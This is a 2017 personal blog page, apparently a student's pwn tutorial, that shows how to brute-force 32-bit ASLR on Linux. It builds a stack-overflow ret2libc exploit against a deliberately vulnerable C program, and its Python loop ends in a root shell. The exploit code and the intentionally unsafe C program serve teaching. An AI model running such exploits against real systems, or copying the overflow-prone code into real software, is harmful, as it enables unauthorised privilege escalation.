@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>ASLR Bruteforce</title>
+	
+	<meta name="description" content="How to defeat ASLR on a 32 bits Linux system.">
+	
+	<meta name="author" content="Quentin Meffre">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+	<link href="/assets/css/syntax.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/https://github.com/meffre-q">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/https://twitter.com/0xdagger">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="//www.gravatar.com/avatar/726351295ec82e145928582f595aa3aa?s=35" class="img-circle" />
+				quentin meffre
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs" style="">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="/assets/media/joker.jpg" class="img-circle" />
+	</a>
+	<h3 class="title">
+        <a href="/">quentin meffre</a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Computer science student, passionate about Cyber Security.
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/https://github.com/meffre-q">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/https://twitter.com/0xdagger">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/https://www.linkedin.com/in/quentin-meffre/">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>ASLR Bruteforce </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   May 
+	   14th,
+	   
+	   2017
+	 </span>
+	  <div class="article_body">
+	  <h1 id="1-surroundings">1. Surroundings</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>uname <span class="nt">-a</span>
+Linux debian 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux</span>
+
+<span class="nv">$ </span>lsb_release <span class="nt">-a</span>
+No LSB modules are available.
+Distributor ID:	Debian
+Description:	Debian GNU/Linux 8.7 <span class="o">(</span>jessie<span class="o">)</span>
+Release:	8.7
+Codename:	jessie
+
+<span class="nv">$ </span>gcc <span class="nt">--version</span>
+gcc <span class="o">(</span>Debian 4.9.2-10<span class="o">)</span> 4.9.2
+
+<span class="nv">$ </span>/lib32/libc.so.6 
+GNU C Library <span class="o">(</span>Debian GLIBC 2.19-18+deb8u7<span class="o">)</span> stable release version 2.19, by Roland McGrath et al.
+</code></pre></div></div>
+
+<h1 id="2-explanation">2. Explanation</h1>
+<p>Today I will show you a method to bruteforce the ASLR. This method is very usefull because it can bypass NX and ASLR protections together! But this method is only available in a x86 or less architecture because of the addresses lenght. The step is very similar as a Ret2libc attack but in our case we will take a LibC base reference address and loop the binary execution while the ASLR isn’t set to our LibC reference’s address.</p>
+
+<h1 id="3-vulnerable-binary">3. Vulnerable binary</h1>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="c1">// gcc main.c -z execstack -fno-stack-protector -m32
+</span>
+<span class="kt">void</span> <span class="nf">print_name</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Welcome %s!"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">ac</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">av</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">ac</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Usage : ./a.out [name]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="n">print_name</span><span class="p">(</span><span class="n">av</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>checksec <span class="nt">--file</span> a.out       
+RELRO           STACK CANARY      NX            PIE          RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
+No RELRO        No canary found   NX enabled    No PIE       No RPATH   No RUNPATH   No	0		   4   a.out
+</code></pre></div></div>
+
+<p>It’s a very simple peace of code with an overflow in “print_name” function.</p>
+
+<h1 id="4-the-payload">4. The payload</h1>
+<p>The payload is very easy. It will look like:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-------------------+
+|      padding      |
++-------------------+
+|  system address<span class="s1">'s |
++-------------------+
+|   exit address'</span>s  |
++-------------------+
+| /bin/sh address<span class="s1">'s |
++-------------------+
+</span></code></pre></div></div>
+
+<p>Well, it’s a Ret2libc as we’ve seen in the previous article. The particularity is that we don’t know any of the addresses we needed. So we first need to know the LibC address’s to deduct the addresses we needed.</p>
+
+<p>If we check the library addresses we can see something very interesting:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ldd a.out|grep libc
+	libc.so.6 <span class="o">=&gt;</span> /lib32/libc.so.6 <span class="o">(</span>0xf757f000<span class="o">)</span>
+
+<span class="nv">$ </span>ldd a.out|grep libc
+	libc.so.6 <span class="o">=&gt;</span> /lib32/libc.so.6 <span class="o">(</span>0xf75fb000<span class="o">)</span>
+
+<span class="nv">$ </span>ldd a.out|grep libc
+	libc.so.6 <span class="o">=&gt;</span> /lib32/libc.so.6 <span class="o">(</span>0xf7555000<span class="o">)</span>
+
+ldd a.out|grep libc
+	libc.so.6 <span class="o">=&gt;</span> /lib32/libc.so.6 <span class="o">(</span>0xf751e000<span class="o">)</span>
+</code></pre></div></div>
+
+<p>There are only 8 bits of the Libc address’s which evolves. So if we take randomly one of these addresses, there is a lot of chance that we will get it an other time!</p>
+
+<p>So we’ve the Libc address, now we need the system/exit offset functions to add it to our base Libc address to know the final addresses function. I will use objdump to get the offsets:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-D</span> /lib32/libc.so.6|egrep <span class="s2">"&lt;exit&gt;:|&lt;__libc_system&gt;:"</span>
+000311b0 &lt;<span class="nb">exit</span><span class="o">&gt;</span>:
+0003e3e0 &lt;__libc_system&gt;:
+</code></pre></div></div>
+
+<p>It’s OK for the addresses offsets. Now we need a string for the first system function argument.
+To remind:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">system</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">command</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>We will use a little trick to do this. We will use a string from the binary section where the addresses don’t change (like rodata section). The string need to end with a null byte. (‘\0’) I’m habits to use a common binary string in the dynstr section:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-s</span> a.out <span class="nt">-j</span> .dynstr|grep <span class="s2">"gmon"</span>
+ 804825c 5f676d6f 6e5f7374 6172745f 5f00474c  _gmon_start__.GL
+</code></pre></div></div>
+
+<p>Great, the string “_gmon_start__” will be perfect. As this command does not exist actually, we will create it. The file “/tmp/_gmon_start__” will contain:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+/bin/sh
+</code></pre></div></div>
+
+<p>No more or less! After did it, we set the correct right to the file and we add “/tmp” repertory to the $PATH environment variable:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 777 /tmp/_gmon_start__ <span class="o">&amp;&amp;</span> <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/tmp
+</code></pre></div></div>
+
+<p>As you might understand, we will execute a command we’ve create, named “_gmon_start__” which will execute a /bin/sh.</p>
+
+<p>It’s OK for this part! The last step before writting the exploit is to get the padding. Another time thanks to objdump:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-D</span> a.out|grep <span class="s2">"&lt;print_name&gt;:"</span> <span class="nt">-A</span> 17 <span class="nt">-n</span>              
+372:0804845b &lt;print_name&gt;:
+373- 804845b:	55                   	push   %ebp
+374- 804845c:	89 e5                	mov    %esp,%ebp
+375- 804845e:	83 ec 48             	sub    <span class="nv">$0x48</span>,%esp
+376- 8048461:	83 ec 08             	sub    <span class="nv">$0x8</span>,%esp
+377- 8048464:	ff 75 08             	pushl  0x8<span class="o">(</span>%ebp<span class="o">)</span>
+378- 8048467:	8d 45 b8             	lea    <span class="nt">-0x48</span><span class="o">(</span>%ebp<span class="o">)</span>,%eax
+379- 804846a:	50                   	push   %eax
+380- 804846b:	e8 b0 fe ff ff       	call   8048320 &lt;strcpy@plt&gt;
+381- 8048470:	83 c4 10             	add    <span class="nv">$0x10</span>,%esp
+382- 8048473:	83 ec 08             	sub    <span class="nv">$0x8</span>,%esp
+383- 8048476:	8d 45 b8             	lea    <span class="nt">-0x48</span><span class="o">(</span>%ebp<span class="o">)</span>,%eax
+384- 8048479:	50                   	push   %eax
+385- 804847a:	68 70 85 04 08       	push   <span class="nv">$0x8048570</span>
+386- 804847f:	e8 8c fe ff ff       	call   8048310 &lt;<span class="nb">printf</span>@plt&gt;
+387- 8048484:	83 c4 10             	add    <span class="nv">$0x10</span>,%esp
+388- 8048487:	c9                   	leave  
+389- 8048488:	c3                   	ret    
+</code></pre></div></div>
+
+<p>You can see at line 378 that our buffer is at 0x48 bytes from the base pointer. So we just need to add four bytes to this value to also erase ebp value. A little “echo” tricks to convert value from a base to another:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"ibase=16; 4C"</span>|bc
+76
+</code></pre></div></div>
+
+<p>We can now write our exploit!</p>
+
+<h1 id="5-the-exploit">5. The exploit</h1>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<span class="c"># coding: utf-8</span>
+
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">base</span> <span class="o">=</span> <span class="mh">0xf756e000</span>           <span class="c"># base libc address's</span>
+<span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0x0003e3e0</span>  <span class="c"># system offset function</span>
+<span class="n">exit_offset</span> <span class="o">=</span> <span class="mh">0x000311b0</span>    <span class="c"># exit offset function</span>
+<span class="n">binsh</span> <span class="o">=</span>  <span class="mh">0x804825c</span>          <span class="c"># string addresse's (_gmon_start__)</span>
+
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">system_offset</span> <span class="c"># final system address's</span>
+<span class="n">exit_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">exit_offset</span>     <span class="c"># final exit address's</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">76</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">system_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">exit_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">binsh</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s">"./a.out"</span><span class="p">,</span> <span class="n">payload</span><span class="p">])</span>	
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="p">:</span>
+    	<span class="k">print</span> <span class="s">"Done"</span>
+    	<span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+    	<span class="k">print</span> <span class="s">"KO</span><span class="se">\n</span><span class="s">"</span>
+</code></pre></div></div>
+
+<h1 id="6-exploitation">6. Exploitation</h1>
+<p>Sometimes the input/output failed, so you need to retry the exploitation to correct it.</p>
+
+<p>A root shell per favor!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python exploit.py
+...
+KO
+
+KO
+
+KO
+
+<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Done.</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#pwn-ref">
+					pwn <span>(1)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#pwn-ref">
+					pwn <span>(1)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#asm-ref">
+					asm <span>(2)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=ASLR Bruteforce&via=https://twitter.com/0xdagger"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="//www.gravatar.com/avatar/726351295ec82e145928582f595aa3aa" class="img-rounded author-image" />
+        <h4 class="section-title author-name">Quentin Meffre</h4>
+        <p class="author-bio">Computer science student, passionate about Cyber Security.</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/general/setup/demo/2013/11/15/hello-world.html" title="Hello World!">&larr; Previous</a></li>
+		  
+		  
+		  <li class="next"><a href="/shellcode/2017/05/28/basic_shellcode.html" title="Basic Shellcode">Next &rarr;</a></li>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2017 Quentin Meffre with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-90952644-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
